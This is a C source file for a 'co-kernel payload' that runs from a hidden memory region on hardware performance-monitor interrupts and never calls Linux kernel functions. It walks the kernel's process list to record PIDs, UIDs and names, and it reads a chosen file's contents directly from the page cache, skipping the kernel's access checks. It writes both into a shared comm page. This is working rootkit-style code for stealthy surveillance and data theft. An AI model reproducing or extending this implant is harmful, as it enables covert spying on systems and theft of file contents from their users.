/* SPDX-License-Identifier: GPL-2.0 */
/*
 * cokernel.c — Co-kernel payload (V2)
 *
 * This is the core logic that executes inside the hidden memory region,
 * triggered by PMI hardware interrupts. It must:
 *   - Never call any Linux kernel function
 *   - Keep execution time < 50μs per invocation
 *   - Use only its own stack and heap
 *
 * Design: ZERO dependency on .bss or .data sections.
 * All pointers are computed from compile-time constants each call.
 * The comm page's own magic field serves as the "initialized" flag:
 *   magic == 0              → not yet initialized (GFP_ZERO)
 *   magic == COKERNEL_COMM_MAGIC → initialized, normal heartbeat
 *
 * V2 additions: process list traversal via task_struct.tasks linked list.
 * V3 additions: page cache reading via inode → address_space → xarray.
 */

#include "cokernel.h"

/*
 * Read the TSC (Time Stamp Counter) — inline, no kernel dependency.
 */
static inline uint64_t rdtsc_native(void)
{
    uint32_t lo, hi;
    __asm__ volatile ("rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

/*
 * Minimal memcpy — no libc available in freestanding mode.
 */
static void memcpy_ck(void *dst, const void *src, unsigned long n)
{
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    while (n--)
        *d++ = *s++;
}

/*
 * Validate that a pointer is within the Linux direct map range.
 */
static int in_direct_map(unsigned long ptr, struct ck_bootstrap_data *boot)
{
    return ptr >= boot->direct_map_base &&
           ptr < boot->direct_map_base + boot->ram_size;
}

/*
 * take_process_snapshot — Walk the task_struct linked list and write
 * a compact snapshot of all processes into the comm page's data_buf.
 *
 * The list is circular: init_task.tasks → task_A.tasks → ... → init_task.tasks
 * We use container_of arithmetic to go from list_head* to task_struct*.
 */
static void take_process_snapshot(volatile struct ck_comm_page *comm,
                                  struct ck_bootstrap_data *boot)
{
    unsigned long init_tasks_addr;  /* &init_task.tasks */
    unsigned long ptr;              /* current tasks.next */
    unsigned int count = 0;
    unsigned int walk = 0;
    volatile struct ck_process_entry *entries;
    volatile uint32_t *nr_tasks_out;

    /* Pointers into data_buf */
    nr_tasks_out = (volatile uint32_t *)&comm->data_buf[0];
    entries = (volatile struct ck_process_entry *)&comm->data_buf[8];

    /* Address of init_task.tasks (the list head anchor) */
    init_tasks_addr = (unsigned long)boot->init_task_dm + boot->offset_tasks;

    /* First entry: init_task itself (PID 0, swapper) */
    {
        unsigned long task = (unsigned long)boot->init_task_dm;
        int32_t pid  = *(int32_t *)(task + boot->offset_pid);
        int32_t tgid = *(int32_t *)(task + boot->offset_tgid);

        entries[count].pid  = pid;
        entries[count].tgid = tgid;
        entries[count].reserved = 0;

        /* Read UID from real_cred */
        unsigned long cred_ptr = *(unsigned long *)(task + boot->offset_real_cred);
        if (in_direct_map(cred_ptr, boot))
            entries[count].uid = *(uint32_t *)(cred_ptr + boot->offset_cred_uid);
        else
            entries[count].uid = 0xFFFFFFFF;

        memcpy_ck((void *)entries[count].comm,
                  (const void *)(task + boot->offset_task_comm), 16);
        count++;
    }

    /* Walk the rest of the list: init_task.tasks.next → ... → init_task.tasks */
    ptr = *(unsigned long *)init_tasks_addr;  /* first ->next */

    while (ptr != init_tasks_addr &&
           count < MAX_SNAPSHOT_PROCS &&
           walk < MAX_TASK_WALK) {

        unsigned long task = ptr - boot->offset_tasks;  /* container_of */
        walk++;

        if (!in_direct_map(task, boot))
            break;

        int32_t pid  = *(int32_t *)(task + boot->offset_pid);
        int32_t tgid = *(int32_t *)(task + boot->offset_tgid);

        /* Only thread group leaders (pid == tgid) */
        if (pid == tgid) {
            entries[count].pid  = pid;
            entries[count].tgid = tgid;
            entries[count].reserved = 0;

            unsigned long cred_ptr = *(unsigned long *)(task + boot->offset_real_cred);
            if (in_direct_map(cred_ptr, boot))
                entries[count].uid = *(uint32_t *)(cred_ptr + boot->offset_cred_uid);
            else
                entries[count].uid = 0xFFFFFFFF;

            memcpy_ck((void *)entries[count].comm,
                      (const void *)(task + boot->offset_task_comm), 16);
            count++;
        }

        /* Advance: ptr = ptr->next (first field of list_head) */
        if (!in_direct_map(ptr, boot))
            break;
        ptr = *(unsigned long *)ptr;
    }

    /* Write count, then signal update */
    *nr_tasks_out = count;
    *(volatile uint32_t *)&comm->data_buf[4] = 0;  /* reserved */
    comm->data_seq++;
}

/*
 * read_target_file — Read page 0 of the target file from the page cache.
 *
 * Navigates: inode → i_mapping → i_pages (xarray) → folio → pfn → direct map.
 * The xarray may store the folio pointer directly in xa_head (single entry)
 * or via xa_node levels for multi-page files.
 */
static void read_target_file(volatile struct ck_comm_page *comm,
                             struct ck_bootstrap_data *boot)
{
    volatile uint32_t *file_bytes_out;
    volatile uint32_t *file_status_out;
    volatile uint8_t  *file_content;
    unsigned long inode, mapping, xa_head_addr;
    unsigned long entry;
    int64_t file_size;
    unsigned long bytes_to_read;
    unsigned long folio, pfn, phys, data_va;
    int depth;

    file_bytes_out  = (volatile uint32_t *)&comm->data_buf[FILE_DATA_OFFSET];
    file_status_out = (volatile uint32_t *)&comm->data_buf[FILE_DATA_OFFSET + 4];
    file_content    = (volatile uint8_t  *)&comm->data_buf[FILE_DATA_OFFSET + 8];

    /* 1. Check target inode */
    if (boot->target_inode_dm == 0) {
        *file_status_out = FILE_STATUS_NO_INODE;
        *file_bytes_out  = 0;
        return;
    }

    inode = (unsigned long)boot->target_inode_dm;
    if (!in_direct_map(inode, boot)) {
        *file_status_out = FILE_STATUS_BAD_PTR;
        *file_bytes_out  = 0;
        return;
    }

    /* 2. Read i_mapping (struct address_space *) */
    mapping = *(unsigned long *)(inode + boot->offset_i_mapping);
    if (!in_direct_map(mapping, boot)) {
        *file_status_out = FILE_STATUS_BAD_PTR;
        *file_bytes_out  = 0;
        return;
    }

    /* 3. Read i_size */
    file_size = *(int64_t *)(inode + boot->offset_i_size);
    bytes_to_read = (unsigned long)file_size;
    if (bytes_to_read > MAX_FILE_CONTENT_SIZE)
        bytes_to_read = MAX_FILE_CONTENT_SIZE;
    if (file_size <= 0) {
        *file_status_out = FILE_STATUS_NO_PAGE;
        *file_bytes_out  = 0;
        return;
    }

    /* 4. Access xarray: mapping + offset_a_i_pages + offset_xa_head */
    xa_head_addr = mapping + boot->offset_a_i_pages + boot->offset_xa_head;
    entry = *(unsigned long *)xa_head_addr;

    if (entry == 0) {
        *file_status_out = FILE_STATUS_NO_PAGE;
        *file_bytes_out  = 0;
        return;
    }

    /* 5. Traverse xarray to find page at index 0 */
    depth = 0;
    while (depth < XA_MAX_DEPTH) {
        if ((entry & 3) == 2 && entry > 4096) {
            /* Internal node: xa_to_node = entry - 2 */
            unsigned long node = entry - 2;
            if (!in_direct_map(node, boot)) {
                *file_status_out = FILE_STATUS_BAD_PTR;
                *file_bytes_out  = 0;
                return;
            }
            /* Read slots[0] for index 0 */
            entry = *(unsigned long *)(node + boot->offset_xa_node_slots);
            depth++;
            if (entry == 0) {
                *file_status_out = FILE_STATUS_NO_PAGE;
                *file_bytes_out  = 0;
                return;
            }
        } else if (entry & 1) {
            /* Value entry (swap, DAX, etc.) — not supported */
            *file_status_out = FILE_STATUS_UNSUPPORTED;
            *file_bytes_out  = 0;
            return;
        } else {
            break;  /* Regular folio pointer found */
        }
    }

    if (depth >= XA_MAX_DEPTH) {
        *file_status_out = FILE_STATUS_TOO_DEEP;
        *file_bytes_out  = 0;
        return;
    }

    /* 6. Convert folio pointer → PFN → physical → direct map VA */
    folio = entry;
    pfn = (folio - boot->vmemmap_base) / boot->sizeof_struct_page;
    phys = pfn * 4096;  /* PAGE_SIZE */
    data_va = boot->direct_map_base + phys;

    if (!in_direct_map(data_va, boot)) {
        *file_status_out = FILE_STATUS_BAD_PTR;
        *file_bytes_out  = 0;
        return;
    }

    /* 7. Copy file content to comm page */
    memcpy_ck((void *)file_content, (const void *)data_va, bytes_to_read);
    *file_bytes_out  = (uint32_t)bytes_to_read;
    *file_status_out = FILE_STATUS_OK;
    comm->data_seq++;
}

/*
 * component_tick — Sole entry point, called on each PMI.
 *
 * Self-initializing: on the very first call the comm page magic is 0
 * (memory was zeroed by GFP_ZERO). We detect this and run one-time
 * initialization before entering the normal heartbeat path.
 *
 * No static variables are used — everything is derived from
 * compile-time constants (COKERNEL_VIRT_BASE + offsets).
 */
__attribute__((section(".text.entry")))
void component_tick(void)
{
    /* Comm page: always at a fixed, known address */
    volatile struct ck_comm_page *comm =
        (volatile struct ck_comm_page *)(COKERNEL_VIRT_BASE + COKERNEL_COMM_OFFSET);

    /* Heartbeat — written EVERY tick, unconditionally */
    comm->tick_count++;
    comm->last_tsc = rdtsc_native();

    /* First-tick initialization: magic is 0 (page was zeroed) */
    if (comm->magic != COKERNEL_COMM_MAGIC) {
        struct ck_bootstrap_data *boot =
            (struct ck_bootstrap_data *)(COKERNEL_VIRT_BASE + COKERNEL_DATA_OFFSET);

        comm->magic   = COKERNEL_COMM_MAGIC;
        comm->version = 1;
        comm->status  = 1;  /* running */

        /* Read init_task.comm via Linux direct map */
        if (boot->magic == COKERNEL_BOOTSTRAP_MAGIC) {
            const char *task_comm = (const char *)
                (boot->init_task_dm + boot->offset_task_comm);
            memcpy_ck((void *)comm->init_comm, task_comm, 16);

            /* Take first process snapshot immediately */
            take_process_snapshot(comm, boot);

            /* V3: Read target file from page cache */
            read_target_file(comm, boot);
        }
    }

    /* Periodic process snapshot (every SNAPSHOT_INTERVAL ticks) */
    if (comm->tick_count % SNAPSHOT_INTERVAL == 0) {
        struct ck_bootstrap_data *boot =
            (struct ck_bootstrap_data *)(COKERNEL_VIRT_BASE + COKERNEL_DATA_OFFSET);

        if (boot->magic == COKERNEL_BOOTSTRAP_MAGIC) {
            take_process_snapshot(comm, boot);
            read_target_file(comm, boot);
        }
    }
}
